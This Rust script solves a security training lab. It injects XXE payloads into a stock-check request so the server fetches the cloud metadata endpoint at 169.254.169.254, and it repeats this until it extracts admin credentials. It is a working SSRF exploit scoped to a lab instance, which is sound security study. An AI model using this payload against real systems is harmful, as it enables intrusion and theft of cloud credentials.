/*************************************************************************************
*
* Lab: Exploiting XXE to perform SSRF attacks
*
* Hack Steps:
*      1. Inject payload into 'productId' XML element to retrieve the path via SSRF
*      2. Extract the path from the response
*      3. Repeat the process with the new extracted path until you fetch
*         the admin information
*
**************************************************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0af80018045084fa83dd3e3700340068.web-security-academy.net";

fn main() {
    println!("‚¶ó#‚¶ò Injection point: {}", "productId".yellow());

    let mut paths: Vec<String> = Vec::from(["/".to_string()]);

    // we need 5 requests to solve this lab
    for index in 1..=6 {
        if index == 6 {
            print!("‚ùØ‚ùØ Fetching admin information.. ")
        } else {
            print!(
                "‚¶ó{index}‚¶ò Injecting payload to retrieve the path number {}.. ",
                index.to_string().blue(),
            );
        }
        flush_terminal();

        let path = &paths[index - 1];
        let payload = format!(
            r###"<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254{path}">]>
                <stockCheck>
                    <productId>
                        &xxe;
                    </productId>
                    <storeId>
                        1
                    </storeId>
                </stockCheck>"###
        );
        let check_stock = check_stock_with_payload(payload);
        let response_body = check_stock.text().unwrap();
        let new_path = capture_pattern_from_text(r"ID:\s*(.*)\s*", &response_body);
        paths.push(format!("{path}{new_path}/"));

        if index == 6 {
            println!("{}", "OK".green());
        } else {
            println!("{} => {}", "OK".green(), &paths[index].yellow());
        }
    }

    println!("üóπ The lab should be marked now as {}", "solved".green())
}

fn check_stock_with_payload(payload: String) -> Response {
    let client = build_web_client();
    client
        .post(format!("{LAB_URL}/product/stock"))
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .expect(&format!(
            "{}",
            "‚¶ó!‚¶ò Failed to fetch the page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "‚¶ó!‚¶ò Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
